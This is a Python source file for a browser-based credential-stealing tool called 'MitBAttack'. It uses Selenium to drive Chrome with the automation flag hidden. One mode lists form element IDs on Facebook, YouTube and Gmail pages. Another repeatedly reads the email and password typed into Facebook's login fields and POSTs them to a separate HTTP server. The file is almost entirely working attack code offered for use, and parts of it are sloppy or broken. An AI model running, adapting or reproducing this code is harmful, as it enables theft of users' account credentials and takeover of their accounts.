import socket
import urllib.request
from urllib.parse import urlparse
from urllib.request import urlopen
import queue
import os 
import sys
import paramiko
import threading
import ctypes
import time
import pythoncom
import webbrowser
import win32gui
import win32con
from selenium import webdriver #Get Driver for chromedriver from here https://chromedriver.storage.googleapis.com/index.html?path=84.0.4147.30/
from selenium.webdriver.common.keys import Keys
import http.cookiejar
import win32com.client #Use the following command to install this module: => python -m pip install pywin32
from netaddr import IPNetwork, IPAddress #Use the following command to install this module: => pip install netaddr to install this
from html.parser import HTMLParser
WindowsClassObject = '{9BA05972-F6AB-11CF-A442-00A0C90A8F39}' #The class ID for Internet Explorer

def MitBAttack(Option):

    if Option == "spider":
        print("THIS MODE IS FOR INFO GATHERING PURPOSES")
        print("NAVIGATE THROUGH THE FIRST TAB TO DISCOVER FORM ELEMENTS FROM SITES")

        #THIS TECHNIQUE ALLOWS US TO WAIT FOR THE BROWSER TO VISIT DESIRED SITES
        chrome_options = webdriver.ChromeOptions(); 
        chrome_options.add_experimental_option("excludeSwitches", ['enable-automation']);
        driver = webdriver.Chrome(options=chrome_options);
        driver.get("https://google.com") 
        
        while True:

            DriverVal = driver.window_handles
            
            for x in DriverVal:
                print("CHROME TAB MAIN:", x)
                src = driver.page_source

        
                if "facebook" in src:
                    print("WE FOUND FACEBOOK")
                    #driver.find_element_by_name("logout_form").submit()
            
                    print("")
                    print("FACEBOOK FORM ELEMENTS:")
                    print("")

                    print("COPY THE CONTENTS TO A FILE!!!")
                    ElFile = input("Enter the file name here: => ")
                    EleConts = open(ElFile, 'w')
                    EleConts.close()

                    ids = driver.find_elements_by_xpath('//*[@id]')
                    for ii in ids:

                        #print ii.tag_name
                        print(ii.get_attribute('id'))
                                        
                        
                    time.sleep(20)
                    os.system("cls")

                if "youtube" in src:
                    print("WE FOUND YOUTUBE")
                    #driver.find_element_by_name("logout_form").submit()
            
                    print("")
                    print("YOUTUBE FORM ELEMENTS:")
                    print("")

                    print("COPY THE CONTENTS TO A FILE!!!")
                    ElFile = input("Enter the file name here: => ")
                    EleConts = open(ElFile, 'w')
                    EleConts.close()

                    ids = driver.find_elements_by_xpath('//*[@id]')
                    for ii in ids:
                        #print ii.tag_name
                        print(ii.get_attribute('id'))

                    
                    time.sleep(20)
                    os.system("cls")


                if "gmail" in src:
                    print("WE FOUND GMAIL")
                    #driver.find_element_by_name("logout_form").submit()
            
                    print("")
                    print("GMAIL FORM ELEMENTS:")
                    print("")

                    print("COPY THE CONTENTS TO A FILE!!!")
                    ElFile = input("Enter the file name here: => ")
                    EleConts = open(ElFile, 'w')
                    EleConts.close()

                    ids = driver.find_elements_by_xpath('//*[@id]')
                    for ii in ids:
                        #print ii.tag_name
                        print(ii.get_attribute('id'))


                    time.sleep(20)
                    os.system("cls")

            time.sleep(3)
            os.system("cls") 
                
    
    if Option == "exe":
        
        Cc = input("Run the HTTP Server, then hit enter")
        HTTPClient = http.client.HTTPConnection('localhost:8080')

        #THIS TECHNIQUE ALLOWS US TO WAIT FOR THE BROWSER TO VISIT DESIRED SITES
        chrome_options = webdriver.ChromeOptions(); 
        chrome_options.add_experimental_option("excludeSwitches", ['enable-automation']);
        driver = webdriver.Chrome(options=chrome_options);
        driver.get("https://google.com") 
        
        while True:

            DriverVal = driver.window_handles
            
            for x in DriverVal:
                print("CHROME TAB MAIN:", x)
                src = driver.page_source

        
                if "facebook" in src:
                    print("WE FOUND FACEBOOK")
                    Fb = "FACEBOOK CREDENTIALS"
                    EncodeFB = str.encode(Fb)
                    HTTPClient.send(EncodeFB)
                    
                    while True:
                        #sd = input("HIT ENTER")

                        FindUserName = driver.find_element_by_name("email")
                        FindPassWd = driver.find_element_by_name("pass")
                        UserVal = FindUserName.get_attribute("value")
                        PassWdVal = FindPassWd.get_attribute("value")
                
                        HTTPClient.request("POST", "", UserVal + PassWdVal)
                        #HTTPClient.request("POST", "", PassWdVal)

                        #Record resposne
                        Response = HTTPClient.getresponse()
    
                        if Response.status == 200:
       
                            print("")
                            print("PAGE FOUND ", "HTTP-CODE: => ", Response.status, " Response Reason: => ", Response.reason)
    
                        if Response.status == 404:
        
                            print("")
                            print("ERROR: => ", Response.status, " " , Response.reason)

                        time.sleep(3)
    
            time.sleep(3)
            os.system("cls")
    
                
print("Select Mode for MitBAttack:")
print("Spider Mode: => spider")
print("Exe Mode: => exe")

while True:
    
    ProgOpt = input("Enter Now: => ")

    if ProgOpt == "spider":
        MitBAttack(ProgOpt)

    elif ProgOpt == "exe":
        MitBAttack(ProgOpt)

    else:
        print("Invalid Command")


